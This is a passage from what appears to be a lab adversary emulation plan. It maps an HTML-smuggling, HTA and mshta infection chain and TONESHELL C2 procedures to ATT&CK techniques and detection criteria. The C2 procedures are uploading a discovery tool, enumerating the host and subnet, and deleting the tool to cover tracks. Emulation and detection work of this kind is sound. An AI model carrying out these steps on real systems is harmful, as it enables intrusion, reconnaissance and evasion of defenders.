| labuser CTRL-clicks docx hyperlink to staging.html | Execution | T1204.001 | User Execution: Malicious Link | Windows | `winword.exe` spawns a browser child process (`msedge.exe` or `chrome.exe`) that navigates to `http://192.168.56.2:8080/staging.html` - Office process spawning a browser with a direct HTTP URL is anomalous relative to the standard Word usage baseline on WS01 | Not Calibrated - Not Benign | transport | `labuser` opens the lure document and CTRL+clicks the embedded hyperlink; `winword.exe` triggers browser navigation to `http://192.168.56.2:8080/staging.html` instead of the ZIP | WS01 (10.12.10.30) | TESTLAB\labuser | [staging.html](../resources/payloads/user-trigger/html-smuggling-hta/) | - |
| browser reconstructs Essos_Compliance_Update.hta from embedded base64 | Stealth | T1027.006 | Obfuscated Files or Information: HTML Smuggling | Windows | `msedge.exe`/`chrome.exe` writes `C:\Users\labuser\Downloads\Essos_Compliance_Update.hta` with no matching outbound HTTP fetch of that file - the .hta bytes are assembled client-side from base64 embedded in the page, so the file write has no preceding download response carrying it; baseline: browser writes to Downloads are preceded by a matching network fetch | Calibrated - Not Benign | - | `staging.html` rebuilds `Essos_Compliance_Update.hta` from an embedded base64 blob and writes it to `Downloads\` with no corresponding HTTP GET for the file | WS01 (10.12.10.30) | TESTLAB\labuser | [staging.html](../resources/payloads/user-trigger/html-smuggling-hta/) | - |
| labuser opens the smuggled HTA file | Execution | T1204.002 | User Execution: Malicious File | Windows | `explorer.exe` spawns `mshta.exe` with `C:\Users\labuser\Downloads\Essos_Compliance_Update.hta` as its argument - user-initiated execution of an .hta from a user Downloads path; baseline: WS01 users do not open .hta files from Downloads | Not Calibrated - Not Benign | transport | `labuser` double-clicks `Downloads\Essos_Compliance_Update.hta` from the Downloads folder | WS01 (10.12.10.30) | TESTLAB\labuser | [stage1.hta](../resources/payloads/user-trigger/html-smuggling-hta/) | - |
| mshta.exe executes the HTA | Stealth | T1218.005 | System Binary Proxy Execution: Mshta | Windows | `mshta.exe` executes an HTA located in a user-writable Downloads path (`C:\Users\labuser\Downloads\Essos_Compliance_Update.hta`) outside any browser context - a signed Windows proxy binary invoked on a user-supplied .hta; baseline: mshta.exe is never invoked on WS01 in normal operation | Calibrated - Not Benign | - | `explorer.exe` spawns `mshta.exe` with `Essos_Compliance_Update.hta` as its argument; the HTA runs from a user Downloads path | WS01 (10.12.10.30) | TESTLAB\labuser | [stage1.hta](../resources/payloads/user-trigger/html-smuggling-hta/) | - |
| HTA VBScript runs inside mshta.exe | Execution | T1059.005 | Command and Scripting Interpreter: Visual Basic | Windows | `mshta.exe` executes the HTA's embedded VBScript (`Window_OnLoad`) - script/AMSI telemetry records VBScript from `Essos_Compliance_Update.hta` instantiating `MSXML2.DOMDocument`, `ADODB.Stream`, and `Shell.Application` COM objects; baseline: mshta.exe running inline VBScript does not occur on WS01 | Calibrated - Not Benign | - | HTA `Window_OnLoad` VBScript instantiates `MSXML2.DOMDocument`, `ADODB.Stream`, `Scripting.FileSystemObject`, and `Shell.Application` COM objects to decode and stage the loader | WS01 (10.12.10.30) | TESTLAB\labuser | [stage1.hta](../resources/payloads/user-trigger/html-smuggling-hta/) | - |
| HTA drops EssosUpdate.exe and wsdapi.dll from embedded base64 | Stealth | T1027.009 | Obfuscated Files or Information: Embedded Payloads | Windows | `mshta.exe` writes two PE binaries to `C:\Users\labuser\AppData\Local\Temp\` - `EssosUpdate.exe` and `wsdapi.dll` - decoded from base64 blobs embedded in the HTA; mshta.exe creating executable images in `%TEMP%` has no legitimate baseline on WS01 | Calibrated - Not Benign | - | `mshta.exe` writes two PE binaries - `EssosUpdate.exe` and `wsdapi.dll` - to `%TEMP%`, decoded from base64 blobs embedded in the HTA | WS01 (10.12.10.30) | TESTLAB\labuser | [stage1.hta](../resources/payloads/user-trigger/html-smuggling-hta/) | - |
| HTA launches the loader with a hidden window | Stealth | T1564.003 | Hide Artifacts: Hidden Window | Windows | `mshta.exe` spawns `C:\Users\labuser\AppData\Local\Temp\EssosUpdate.exe` as a hidden child process (`Shell.Application.ShellExecute` with `nShow=0`, no visible window) immediately after writing it - mshta.exe launching a freshly-dropped `%TEMP%` PE with no UI; baseline: mshta.exe has no child-process baseline on WS01 | Not Calibrated - Not Benign | C1 | `mshta.exe` calls `Shell.Application.ShellExecute` on `%TEMP%\EssosUpdate.exe` with `nShow=0` (hidden), then closes itself | WS01 (10.12.10.30) | TESTLAB\labuser | [stage1.hta](../resources/payloads/user-trigger/html-smuggling-hta/) | - |

---

## Step 2 - Discovery: Local Host Profiling and NetBIOS Enumeration

### Voice Track

Having established a foothold on WS01, the adversary first profiles the local host before mapping the subnet. They push WNetHelper - a lightweight multi-module discovery tool - to the victim host via the existing C2 file-upload capability. Running in local mode, the tool collects the host profile (hostname, domain, OS version), session identity and group memberships, running processes via the performance counter registry, installed services via direct registry read, local group membership via WinNT ADSI, and top-level filesystem entries across four target paths - all in-process with no child process spawned. The adversary then pivots to network discovery, executing WNetHelper in NBNS scan mode against the local /24 subnet. The scan returns a table of NetBIOS hostnames, workgroup memberships, DC service flags, and VM platform indicators derived from MAC OUI lookup. DC01 is identified at 10.12.10.10 as the domain controller (DC flag set); IIS01 is identified at 10.12.10.20 as a domain-joined server with no DC flag - a high-value lateral movement target for the next phase. The tool binary is deleted immediately after output collection to limit artifact exposure.

### Procedures

1. ☣️ In `toneshell_shell.py`, with WS01 session active - push `WNetHelper.exe` to the target:

   ```
   put WNetHelper.exe C:\Windows\Temp\WNetHelper.exe
   ```

   - ***Expected Output***
     ```text
     [+] File uploaded: WNetHelper.exe → C:\Windows\Temp\WNetHelper.exe
     ```

2. ☣️ Execute combined local discovery and subnet scan:

   ```
   shell C:\Windows\Temp\WNetHelper.exe all 10.12.10.0/24
   # 'all' mode runs both local discovery and NBNS subnet scan in a single invocation
   ```

   - ***Expected Output***
     ```text
     [PROFILE]
       Hostname     : WS01
       Domain       : TESTLAB
       OS Version   : Microsoft Windows NT 6.2.9200.0
       ...

     [SESSION]
       User         : TESTLAB\labuser
       Auth Type    : Kerberos
       Is Admin     : False
       Groups:
         TESTLAB\Domain Users
         ...

     [TASKS]
       PID      Name
       ---      ----
       4        System
       ...      (~90 processes)

     [SERVICES]
       DisplayName                              Start  ImagePath
       ---                                      ---    ---
       ...      (~150 Win32 services)

     [MEMBERS]
       Administrators:
         Administrator
         Domain Admins
       Remote Desktop Users:
         labuser
       ...

     [FILES]
       C:\Users:
         labuser
         ...
       C:\Windows\Temp:
         WNetHelper.exe
         ...

     [HOSTS]
     Scanning 10.12.10.1 - 10.12.10.254
     10.12.10.10    TESTLAB\DC01                  DC        VirtualBox
     10.12.10.20    TESTLAB\IIS01                           VirtualBox
     ```

3. ☣️ Delete the tool binary:

   ```
   shell del /f C:\Windows\Temp\WNetHelper.exe
   ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| TONESHELL FILE_UPLOAD WNetHelper.exe to WS01 disk | Command and Control | T1105 | Ingress Tool Transfer | Windows | `waitfor.exe` (shellcode-injected process with unbacked private RX memory) writes PE-format binary `WNetHelper.exe` to `C:\Windows\Temp\` - file write from an injected non-system process to a world-writable directory; `WNetHelper.exe` is an unsigned .NET PE without Authenticode signature, YARA-detectable at write time on the capability-scan surface | Calibrated - Not Benign | - | Red team uses TONESHELL `put` task to write `WNetHelper.exe` to `C:\Windows\Temp\` on WS01 | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | - |
| WNetHelper reads hostname, domain, and OS version via Environment properties and WMI Win32_OperatingSystem | Discovery | T1082 | System Information Discovery | Windows | `WNetHelper.exe` (unsigned binary from `C:\Windows\Temp\`) issues a WMI query against `Win32_OperatingSystem` - ETW `Microsoft-Windows-WMI-Activity` provider records an anomalous WMI consumer from a non-system binary in a world-writable path performing OS information retrieval | Not Calibrated - Not Benign | native-recon | `WNetHelper.exe local` reads `Environment.MachineName`, `UserDomainName`, `OSVersion` and issues a single WMI query against `Win32_OperatingSystem` on WS01; no child process spawned | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | - |
| WNetHelper reads Windows identity, checks admin role, and translates group SIDs via WindowsIdentity | Discovery | T1033 | System Owner/User Discovery | Windows | N/A - C1: `WindowsIdentity.GetCurrent()`, `IsInRole()`, and `LookupAccountSid` are called by virtually all Windows processes; no stable API pattern distinguishes malicious identity enumeration from benign token inspection - only discriminating factor is process origin, already captured under T1105 | Not Calibrated - Not Benign | C1 | `WNetHelper.exe local` calls `WindowsIdentity.GetCurrent()`, `IsInRole(Administrator)`, and translates identity group SIDs to NTAccount names in-process; no child process | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | - |
| WNetHelper enumerates running processes via HKEY_PERFORMANCE_DATA performance counter registry | Discovery | T1057 | Process Discovery | Windows | `WNetHelper.exe` reads `HKEY_PERFORMANCE_DATA` with value `"230"` (Process performance counter index) to enumerate running processes - registry monitoring observes an unsigned binary from `C:\Windows\Temp\` querying the performance counter virtual hive via an indirect path that bypasses `NtQuerySystemInformation`; HKEY_PERFORMANCE_DATA\230 access is atypical outside monitoring-agent contexts | Calibrated - Not Benign | - | `WNetHelper.exe local` calls `RegQueryValueEx(HKEY_PERFORMANCE_DATA, "230")` to enumerate processes via the performance counter API; avoids `NtQuerySystemInformation` and `OpenProcess`; no child process | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | - |
| WNetHelper enumerates Win32 services via direct registry read of HKLM CurrentControlSet\Services | Discovery | T1007 | System Service Discovery | Windows | `WNetHelper.exe` opens `HKLM\SYSTEM\CurrentControlSet\Services` and sequentially enumerates all subkeys - registry monitoring records an unsigned binary from `C:\Windows\Temp\` performing bulk-read of the Services hive without `OpenSCManager`; sequential subkey enumeration across the full Services tree by a non-system process is an observable registry-access anomaly | Not Calibrated - Not Benign | native-recon | `WNetHelper.exe local` opens `HKLM\SYSTEM\CurrentControlSet\Services` and reads subkey values directly; no `OpenSCManager` or `EnumServicesStatusEx` API call; no child process | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | - |
| WNetHelper enumerates local groups and members via WinNT ADSI DirectoryEntry | Discovery | T1069.001 | Permission Groups Discovery: Local Groups | Windows | `WNetHelper.exe` issues SAMR RPC calls to enumerate local groups and membership via ADSI `WinNT://` provider - observable as loopback named-pipe activity to `\pipe\samr` or via ETW SAMR provider; non-system binary from `C:\Windows\Temp\` making SAMR group-enumeration calls without spawning `net localgroup` | Not Calibrated - Not Benign | native-recon | `WNetHelper.exe local` binds `DirectoryEntry("WinNT://<hostname>,computer")` and invokes `Members` per group - SAMR RPC under the hood; no `net localgroup` child process | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | - |
| WNetHelper enumerates filesystem entries under C:\Users\, C:\Windows\Temp\, Desktop, Documents | Discovery | T1083 | File and Directory Discovery | Windows | `WNetHelper.exe` issues `NtQueryDirectoryFile` calls sequentially across `C:\Users\`, `C:\Windows\Temp\`, and user-profile subdirectories (Desktop, Documents) - file I/O telemetry shows an unsigned binary from `C:\Windows\Temp\` performing targeted multi-path directory enumeration of user-profile and temp locations in sequence | Not Calibrated - Not Benign | native-recon | `WNetHelper.exe local` calls `Directory.GetFileSystemEntries()` on four target paths; no child process spawned | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | - |
| WNetHelper NBNS subnet sweep to 10.12.10.0/24 on UDP/137; responses identify DC-flagged and domain-joined hosts | Discovery | T1018 | Remote System Discovery | Windows | `WNetHelper.exe` sends NBNS NAME QUERY REQUEST packets to every IP in `10.12.10.0/24` via UDP port 137 and receives responses identifying domain-joined hosts - network telemetry shows a systematic per-IP NBNS sweep from a non-OS process; burst rate and full-subnet sequential targeting distinguishes this from background NetBIOS traffic; `DC01` (10.12.10.10) identified as DC-flagged host (NBNS `\x1C` suffix); `IIS01` (10.12.10.20) identified as domain-joined non-DC server from NBNS response | Calibrated - Not Benign | - | `WNetHelper.exe` sends NBNS NAME QUERY REQUEST packets to each IP in `10.12.10.0/24` via UDP port 137 and parses responses to identify domain-joined hosts; DC01 (10.12.10.10) identified as DC-flagged host; IIS01 (10.12.10.20) identified as domain-joined non-DC server; results returned via C2 EXEC response | WS01 (10.12.10.30) | TESTLAB\labuser | [WNetHelper](../resources/payloads/discovery/discovery-toolkit) | - |
| WNetHelper.exe deleted from C:\Windows\Temp\ via cmd.exe del | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `cmd.exe` spawned by `waitfor.exe` (implant process) deletes `C:\Windows\Temp\WNetHelper.exe` via `del /f` - EDR process tree records `waitfor.exe → cmd.exe` executing file deletion immediately after tool run; deletion of a recently-created and executed binary from `C:\Windows\Temp\` by an implant-parented command shell is a traceable cleanup event | Not Calibrated - Not Benign | staging | Red team deletes scanner binary after output collection via TONESHELL `shell del /f` | WS01 (10.12.10.30) | TESTLAB\labuser | - | - |

---
